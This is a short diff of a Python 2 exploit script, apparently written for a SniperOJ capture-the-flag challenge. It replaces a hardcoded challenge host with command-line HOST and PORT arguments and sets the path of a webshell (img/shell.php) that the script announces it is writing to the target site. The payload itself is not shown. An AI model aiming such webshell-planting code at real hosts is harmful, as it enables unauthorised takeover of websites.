@@ -10,9 +10,18 @@
 
 import requests
 
+if len(sys.argv) != 3:
+    print "Usage: "
+    print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
+    exit(1)
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+url = "http://%s:%d/" % (host, port)
+
 print "[+] Writing shell to target site..."
-url = "http://web2.sniperoj.cn:10007/"
-webshell = "http://web2.sniperoj.cn:10007/img/shell.php"
+webshell = "%simg/shell.php" % (url)
 
 session = requests.Session()
 
